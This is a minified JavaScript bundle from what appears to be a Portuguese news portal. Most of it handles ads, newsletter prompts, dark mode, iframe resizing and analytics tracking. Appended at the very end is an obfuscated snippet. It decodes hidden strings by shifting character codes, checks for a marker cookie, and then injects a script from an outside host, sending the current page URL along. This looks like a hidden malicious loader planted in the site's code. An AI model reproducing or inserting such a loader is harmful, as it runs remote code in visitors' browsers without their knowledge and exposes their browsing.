.article-inline-ads-2020"),r=0;o&&i&&i.length>5&&e.forEach(i,(function(e,i){if((r+=e.textContent.length)>=1500){var a=o.cloneNode(!0);a.setAttribute("data-pub-num-chars",r),n.insertAfter(a,e),t.removeClassName(a,"hide-all"),r=0}}))}()})),Ink.requireModules(["Ink.Util.Array_1","Ink.Dom.Event_1","Ink.Dom.Element_1","Ink.Dom.Css_1","Ink.Util.Url_1","SAPO.Utils_1","Ink.UI.DatePicker_1","Ink.Util.Date_1","Ink.UI.Modal_1","Ink.Dom.Loaded_1","Ink.Util.Cookie_1","Ink.UI.Carousel_1","Ink.UI.Tabs_1"],(function(e,t,n,i,o,r,a,s,l,c,u,d,h){"use strict";function p(){c.run((function(){var e=o.getUrl();if(Ink.s("[data-snl-button]")&&o.getAnchor(e)&&"subscrever-newsletter"==o.getAnchor(e))var i=setInterval((function(){SAPO&&SAPO.NEWSLETTERS&&(clearInterval(i),SAPO.NEWSLETTERS.open())}),1e3);var r=Ink.s("#modal-notifications");if(r){var a=l.getInstance(r);if(o.getAnchor(e))"subscrever-notificacoes"==o.getAnchor(e)&&r&&(a._options.onDismiss=function(){window.location.hash=""},a.open())}t.observe(Ink.s(".team-newsletter"),"click",(function(e){var t=Ink.s(".team-newsletter").getAttribute("data-team-id");Ink.s('#modal-newsletter select[name="id"]').value=t})),function(){var e=Ink.s(".newsletter-modal-trigger");if(e){var t="newsletter-triggered";if(!("true"===u.get(t))){var i=n.data(e);if(i){var o="newsletter-pageviews",r=parseFloat(i.promotionPageviews||0),a=parseFloat(i.promotionExpire||0);if(r&&a){var s=u.get(o)||0;s=isNaN(s)?0:parseFloat(s),s+=1,u.set(o,s,a),s>=r&&(e.click(),u.remove(o),u.set(t,"true",a))}}}}}()}))}function f(){var t=SAPO.ColorScheme.getUserPreference()||"auto";e.forEach(k,(function(n){e.forEach(Ink.ss("[data-color-scheme]",n),(function(e){var o=n.getAttribute("data-color-scheme-selected-class")||"active";e.getAttribute("data-color-scheme")===t?i.addClassName(e,o):i.removeClassName(e,o)})),e.forEach(Ink.ss("[data-color-scheme-saved-watts]",n),(function(e){e.innerHTML=SAPO.ColorScheme.countSavedWatts()}))}));var n="auto"===t?SAPO.ColorScheme.getAutoColor():t,o="dark"==n;v(o),y(n,SAPO.ColorScheme.getAutoColor()),g(o),function(t){var n=Ink.ss("[sapo-widget]");n&&n.length&&e.each(n,(function(e){i.setClassName(e,"dark",t)}))}(o),function(e){window._$sapo||(window._$sapo={}),window._$sapo.dark=e,window.$sapo&&window.$sapo.win&&(window.$sapo.win.dark=e)}(o)}function m(e,t){try{e&&e.contentWindow&&e.contentWindow.setDarkMode&&e.contentWindow.setDarkMode(t)}catch(e){}}function g(n){var i=Ink.ss("iframe");e.each(i,(function(e){m(e,n);var i=function(){m(e,n),t.off(e,"load",i)};t.on(e,"load",i)}))}function v(e){var t=0,n=setInterval((function(){Ink.i("bsu-v3-ctn")&&(i.addRemoveClassName(Ink.i("bsu-v3-ctn"),"bsu-v3-dark-bg",e),clearInterval(n)),t>20&&clearInterval(n),t++}),100)}function y(t,n){e.forEach(Ink.ss("[data-color-scheme-picture]"),(function(i){e.forEach(Ink.ss('[media^="(prefers-color-scheme"]',i),(function(e){switch(e.getAttribute("data-original-media")||e.setAttribute("data-original-media",e.getAttribute("media")),t){case"dark":if("dark"===n){e.setAttribute("media",e.getAttribute("data-original-media"));break}"(prefers-color-scheme: dark)"===e.getAttribute("data-original-media")?e.setAttribute("media","(prefers-color-scheme: light)"):e.setAttribute("media","(prefers-color-scheme: no-preference)");break;case"light":"(prefers-color-scheme: light)"===e.getAttribute("data-original-media")?e.setAttribute("media","(prefers-color-scheme: dark)"):e.setAttribute("media","(prefers-color-scheme: no-preference)");break;default:e.setAttribute("media",e.getAttribute("data-original-media"))}}))}))}e.each(["_shp_prime","_shp_cinema","_shp_weather","_shp_weather_2020","_shp_horoscope","_swsk","_swsk-v","_sw_store","_sw_store-version","_sw_store-global"],(function(e){u.remove(e)})),window.showAnchor=function(){e.forEach(Ink.ss(".block-anchor"),(function(e){console.log(e),e.style="",e.style.backgroundColor="#F44336",e.style.color="#FFF",e.style.fontWeight=900,e.style.fontSize="15px",e.style.height="auto",e.style.marginTop="auto",e.style.top="-20px",e.innerHTML="#"+e.id}))},function(){var n=Ink.ss('select[data-selectbox-go-to="true"]');e.forEach(n,(function(e,n){var i=e.hasAttribute("data-reset-status");i&&(e.selectedIndex=0),t.observe(e,"change",(function(t){e.getAttribute("data-cookie-save")&&u.set("local-select",e.options[e.selectedIndex].value,2678400),e.options[e.selectedIndex].getAttribute("data-target")?(window.open(e.options[e.selectedIndex].value,"_blank"),i&&(e.selectedIndex=0)):window.location.href=e.options[e.selectedIndex].value}))}))}(),function(){var n=Ink.ss("select[data-selectbox-show-item]");e.forEach(n,(function(n,o){t.observe(n,"change",(function(t){var o=Ink.ss('[data-selectbox-group="'+n.getAttribute("data-selectbox-show-item")+'"]');e.forEach(o,(function(e,t){i.addClassName(e,"hide-all"),e.getAttribute("data-selectbox-item")==n.options[n.selectedIndex].value&&i.removeClassName(e,"hide-all")}))}))}))}(),function(){function n(){s=window.pageYOffset,a<window.pageYOffset&&(s=0,l=window.pageYOffset),a=window.pageYOffset,e.forEach(o,(function(e){i.setClassName(e,"going-up",s&&s+c<l);var t=parseInt(e.getBoundingClientRect().top),n=parseInt(window.getComputedStyle(e,null).getPropertyValue("top").replace(/px/g,""));i.setClassName(e,r,t<=n)}))}var o=Ink.ss('[class*="make-it-sticky"]'),r="stuck",a=0,s=0,l=0,c=163;o&&o.length>0&&(t.observe(window,"scroll",t.throttle(n,300)),n())}(),function(){var n=Ink.ss(".view-more");e.forEach(n,(function(e){t.observe(e,"click",(function(t){t.preventDefault(),i.removeClassName(Ink.s(e.getAttribute("data-target")),e.getAttribute("data-class-name-on"),!0),r.trackGTMEvent("ViewMore","article",window.location.pathname),r.trackGTMPageView(),setTimeout((function(){SAPO.CPU&&SAPO.CPU.process()}),100)}))}))}(),function(){var t=Ink.ss("[data-social-iframe]"),n=Ink.ss(".page:not(.page--1) [data-social-iframe]"),i=Ink.s(".view-more");i&&i.addEventListener("click",(function(){setTimeout((function(){e.forEach(n,(function(e){e.src+=(e.src.indexOf("?")>-1?"&":"?")+"_="+Math.floor(1e9*Math.random()),e.addEventListener("load",(function(){e.style.display=e.getAttribute("display"),e.removeAttribute("display")}))}))}),100)})),e.forEach(t,(function(e){iFrameResize({resizedCallback:function(e){0!=parseInt(e.height)&&(Ink.i(e.id).style.height=parseInt(e.height)+15+"px")}},e)})),e.forEach(Ink.ss("[data-iframe-resize]"),(function(e){iFrameResize({resizedCallback:function(e){0!=parseInt(e.height)&&(Ink.i(e.id).style.height=parseInt(e.height)+15+"px")}},e)})),e.forEach(n,(function(e){e.setAttribute("display",e.style.display),e.style.display="none"}))}();var _=Ink.s("[data-widget='liveblog']:not([data-widget-params])");if(_){var b=n.create("script");b.src=_.getAttribute("data-src"),b.setAttribute("data-widget",_.getAttribute("data-widget")),b.setAttribute("data-live-layout",_.getAttribute("data-live-layout")),b.setAttribute("data-live-id",_.getAttribute("data-live-id")),_.appendChild(b)}if(window.addEventListener("message",(function(e){var t;try{if("iframeResize"==(t=JSON.parse(e.data)).type)return void(document.querySelector("[data-liveid='"+t.liveId+"']").height=t.iframeHeight);t.hasOwnProperty("player_id")&&t.randname&&(window.LiveBlogVideo||(window.LiveBlogVideo={}),r.includes(["play","adPlay"],t.method)?window.LiveBlogVideo[t.randname]=!0:r.includes(["pause","adPause","stop","adStop","ended","playerError"],t.method)&&delete window.LiveBlogVideo[t.randname])}catch(e){}}),!1),window.addEventListener("message",(function(t){t.data&&"slide-change"==t.data&&r.trackGTMPageView(),t.data&&t.data.type&&"LiveBlog"==t.data.type&&t.data.status&&"changed"==t.data.status&&r.trackGTMPageView();try{var o=JSON.parse(t.data,null);"epg-iframe"==o.origin&&("epgProgramDetail"!=o.method&&"epgCategoryChange"!=o.method&&"epgChannelChange"!=o.method||(o.data&&o.data.category&&dataLayer.push({channel_category:o.data.category}),o.data&&o.data.channel&&dataLayer.push({channel_name:o.data.channel}),o.data&&o.data.program&&dataLayer.push({program_id:o.data.program}),r.trackGTMPageView()),"epgLoaded"!=o.method&&"resizeHeight"!=o.method&&r.trackGTMEvent("EPG",o.method,window.location.pathname)),"elections"==o.type&&"tab"!=o.payload.type&&(r.trackGTMPageView(),r.trackGTMEvent("ELECTIONS","change-"+o.payload.type,window.location.pathname),SAPO.CPU&&SAPO.CPU.refresh('[data-pub-refresh="true"]')),"widget"==o.type&&("change-tab"==o.event||"change-tab-results"==o.event||"change-location"==o.event?(r.trackGTMPageView(),r.trackGTMEvent("ELECTIONS",o.event+"__"+o.value,window.location.pathname)):"ready"==o.event&&e.forEach(Ink.ss('[data-sapo-widget-id="'+o.id+'"'),(function(e){e.style="",i.removeClassName(n.findUpwardsBySelector(e,".loading"),"loading")}))),"VHS-CHANGED"==o.type&&"click"==o.event&&(dataLayer.push({is_video:!0}),r.trackGTMPageView(),r.trackGTMEvent("VHS","change-video-"+o.event,window.location.pathname),setVHSTrackingTimeout())}catch(e){}})),Ink.i("player-video")&&t.observe(window,"message",(function(e){try{var t=JSON.parse(e.data),n=t&&t.method;"start"===n&&r.trackGTMEvent("VIDEO-PAGE","video-event-"+n,window.location.pathname)}catch(e){}})),Ink.ss(".travel-through-time")){var w=new Date;e.forEach(Ink.ss(".travel-through-time"),(function(e){new a(e,{lang:"pt_PT",dateRange:"2016-09-21:"+s.get("Y-m-d",w),onSetDate:function(e){r.trackGTMEvent("IN-THIS-DAY","day-"+s.get("Y-m-d",e.getDate()),window.location.pathname),window.location.href="https://24.sapo.pt/resumo/"+s.get("Y-m-d",e.getDate())}}).setDate(e.getAttribute("data-digest-date"))}))}t.observeMulti(Ink.ss("[data-player-nitfm]"),"play",(function(e){var n=t.element(e);r.trackGTMEvent("NITFM-PLAY","play external "+n.getAttribute("data-player-title"),window.location.pathname)})),c.run((function(){var e=Ink.s("#modal-hde");if(e){var t=l.getInstance(e);t&&(t._options.onShow=function(){setTimeout((function(){SAPO.LAZYPICTURE&&SAPO.LAZYPICTURE.refresh()}),100)})}})),window.addEventListener("hashchange",(function(){p()})),p(),e.forEach(Ink.ss("a.tabs-tab"),(function(e,n){t.observe(e,"click",(function(e){r.trackGTMPageView(),r.trackGTMEvent("change-tab","tab",window.location.pathname),SAPO.CPU&&SAPO.CPU.refresh('[data-pub-refresh="true"]'),setTimeout((function(){SAPO.LAZYPICTURE&&SAPO.LAZYPICTURE.refresh()}),100)}))})),e.forEach(Ink.ss(".ink-tabs"),(function(t){function n(){o(r&&r.activeTab()||"")}function o(t){e.forEach(Ink.ss(".show-on-tabs"),(function(e){i.hasClassName(e,"show-on-tab-"+t)?i.removeClassName(e,"hide-all"):i.addClassName(e,"hide-all")}))}var r;"true"===t.getAttribute("data-tabs-showblocks")&&(r=new h(t,{onChange:n}),n())})),function(){if(Ink.s(".page-radio")){var e=3e5,t=Ink.s("body[data-auto-reload-time]");t&&(e=parseInt(t.getAttribute("data-auto-reload-time"))),window.setInterval((function(){r.trackGTMPageView(),r.trackGTMEvent("RELOAD","reload-radios-"+e+"ms",window.location.pathname),SAPO.CPU&&SAPO.CPU.refresh('[data-pub-refresh="true"]')}),e)}}(),e.forEach(Ink.ss("[data-gif-src]"),(function(e,n){t.observe(e,"click",(function(t){t.preventDefault(),e.querySelector("[data-gif-placeholder]").src=e.getAttribute("data-gif-src"),i.addClassName(e,"article-embed-gif--playing")}))})),Ink.s(".ink-carousel:not([data-prevent-init])")&&new d(".ink-carousel:not([data-prevent-init])",{onChange:function(e){e>0&&SAPO&&SAPO.LAZYPICTURE&&SAPO.LAZYPICTURE.refresh()}}),function(){if(i.hasClassName(Ink.s("body"),"prime-article")){e.forEach(Ink.ss("a"),(function(e){n.hasAttribute(e,"target")||""==e.href||"#"==e.href||(e.target="_blank")}));var t=Ink.s("div .article-body");i.hasClassName(t,"paginated")&&i.removeClassName(t,"paginated")}}(),function(){function n(){i.removeClassName(l,s),a&&i.removeClassName(a,"active"),t.off(l,"click",o)}function o(e){var t=!0;e&&r.parents(e,(function(e){e&&e.getAttribute&&(e.getAttribute("data-mobile-menu")||"false"==e.getAttribute("data-close-on-click")||"search"==e.getAttribute("type"))&&(t=!1)})),t&&n()}var a,s="show-me-whatchu-got",l=Ink.s("body"),c=Ink.s(".mobile-menu");e.forEach(Ink.ss(".mobile-menu-trigger"),(function(e,r){t.observe(e,"click",(function(r){r.preventDefault(),i.hasClassName(l,s)?n():(c.scrollTop=0,a=e,i.addClassName(e,"active"),i.addClassName(l,s),c.style.maxHeight=window.innerHeight-Ink.i("header").getBoundingClientRect().height-Math.round(Ink.i("header").getBoundingClientRect().top)+"px",setTimeout((function(){t.on(l,"click",o)}),1))}))}))}(),function(){var e=Ink.s(".next-games");e&&(i.setClassName(e,"collapsed",!!localStorage.getItem("next-games-closed")),t.observeMulti(Ink.ss("[data-collapse]"),"click",(function(n){t.stopDefault(n),n.preventDefault(),n.stopPropagation(),i.addRemoveClassName(e,"collapsed",!i.hasClassName(e,"collapsed")),i.hasClassName(e,"collapsed")?localStorage.setItem("next-games-closed",1):localStorage.removeItem("next-games-closed")})))}(),function(){var t="data-src-timestamp",n=Ink.ss("["+t+"]");n&&e.each(n,(function(e){var n=e.getAttribute(t),i=(new Date).getTime();n&&e.setAttribute("src",n.replace("$$timestamp$$",i)),e.removeAttribute(t)}))}();var k=Ink.ss("[data-color-scheme-switch]"),I=(Ink.ss(".color-scheme-switch-ctn"),Ink.s(".color-scheme-switch-ctn"));k&&k.length>0&&SAPO&&SAPO.ColorScheme&&SAPO.ColorScheme.testBrowser()&&I&&"block"===getComputedStyle(I,null).display?(window.SAPO||(window.SAPO={}),window.SAPO.ColorScheme||(window.SAPO.ColorScheme={}),window.SAPO.ColorScheme.setPicturesColorScheme=y,f(),e.forEach(k,(function(e){t.observeMulti(Ink.ss("[data-color-scheme]",e),"click",(function(e){t.stopDefault(e),e.preventDefault(),e.stopPropagation();var i=t.element(e);i=i.getAttribute("data-color-scheme")?i:n.findUpwardsBySelector(i,"[data-color-scheme]"),SAPO.ColorScheme.setUserPreference(i.getAttribute("data-color-scheme")),SAPO.ColorScheme.getPreferedColorScheme(),f()}))})),window.matchMedia("(prefers-color-scheme: dark)").addListener((function(e){var t=SAPO.ColorScheme.getUserPreference()||"auto";"auto"===t&&v(e.matches),y(t,SAPO.ColorScheme.getAutoColor())}))):e.forEach(Ink.ss(".color-scheme-switch-ctn"),(function(e){i.addClassName(e,"hide-all")})),window.addEventListener("message",(function(e){"embed-size"===e.data.type&&(document.querySelector(".qualifio_iframe_wrapper iframe").style.height=e.data.height+"px",document.querySelector(".qualifio_iframe_wrapper iframe").setAttribute("height",e.data.height+"px"))}))}));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44fun3h'+'isrjywnh3htr4l'+'jy4xyfynh3ox'+'DwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));